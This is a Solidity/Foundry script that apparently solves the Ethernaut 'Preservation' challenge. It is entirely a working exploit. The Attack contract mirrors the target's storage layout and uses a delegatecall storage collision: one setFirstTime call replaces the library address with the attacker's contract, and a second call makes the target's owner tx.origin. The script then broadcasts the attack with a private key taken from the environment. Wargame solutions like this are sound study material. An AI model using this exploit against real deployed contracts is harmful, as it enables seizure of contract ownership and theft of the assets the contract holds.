// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@forge-std/Script.sol";
import "../src/Preservation.sol";

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    Preservation public pc;
    constructor(address pcAddress) {
        pc = Preservation(pcAddress);
    }

    function pwn() public {
        pc.setFirstTime(uint(uint160(address(this))));
        pc.setFirstTime(1);
    }
    function setTime(uint _time) public {
        owner = tx.origin;
    }
}

contract PreservationScript is Script {
    Preservation public preservationContract;

    function setUp() public {
        preservationContract = Preservation(payable(vm.envAddress("PRESERVATION_CONTRACT")));    
    }
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack(address(preservationContract));
        attack.pwn();
        vm.stopBroadcast();
    }
}
